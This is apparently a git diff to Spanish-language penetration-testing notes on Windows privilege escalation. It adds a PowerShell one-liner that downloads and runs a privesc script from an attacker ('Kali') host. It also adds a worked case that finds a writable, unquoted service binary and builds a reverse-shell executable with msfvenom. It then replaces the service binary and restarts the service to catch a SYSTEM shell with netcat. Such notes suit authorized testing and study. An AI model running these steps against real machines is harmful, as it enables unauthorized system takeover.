@@ -11,6 +11,7 @@ Privilege Escalation (Privesc) — proceso de elevar privilegios desde un acceso
 
 ```bash 
 # Cargar en memoria  <- MEJOR OPCIÓN  
+# Se ejecuta desde un CMD ya que se ejecuta una sesión Powershell 
 ❯ powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://<IP_KALI>/PrivescCheck.ps1');Invoke-PrivescCheck > PrivescCheck.log 
 
 # Cargar en disco 
@@ -165,4 +166,38 @@ Paso 4:
 ❯ sc.exe start WebAPIService
 
 ❯ nc -lvnp 4445
+```
+
+## PrivEsc - Caso 3 
+
+```powersahell 
+# Unquoted 
+
+ServiceName   : WinMonSvc
+Path          : C:\Program Files\Common Files\Services\Service Helper\svchosthelper.exe
+StartName     : LocalSystem
+AbuseFunction : Write-ServiceBinary -ServiceName 'WinMonSvc' -Path <HijackPath>
+
+
+❯ icacls.exe "C:\Program Files\Common Files\Services\Service Helper\svchosthelper.exe"
+C:\Program Files\Common Files\Services\Service Helper\svchosthelper.exe BUILTIN\Users:(F)
+                                                                          NT AUTHORITY\SYSTEM:(I)(F)
+                                                                          BUILTIN\Administrators:(I)(F)
+                                                                          BUILTIN\Users:(I)(RX)
+                                                                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                                                          APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+```
+
+```bash 
+❯ msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=IP_Kali LPORT=443 -f exe -o svchosthelper.exe
+
+❯ rlwrap nc -lvnp 443
+
+# Forma 1:
+❯ Copy-Item .\svchosthelper.exe "C:\Program Files\Common Files\Services\Service Helper\svchosthelper.exe" -Force
+Restart-Service WinMonSvc
+
+# Forma 2:
+❯ copy .\svchosthelper.exe "C:\Program Files\Common Files\Services\Service Helper\svchosthelper.exe"
+❯ Restart-Computer 
 ```
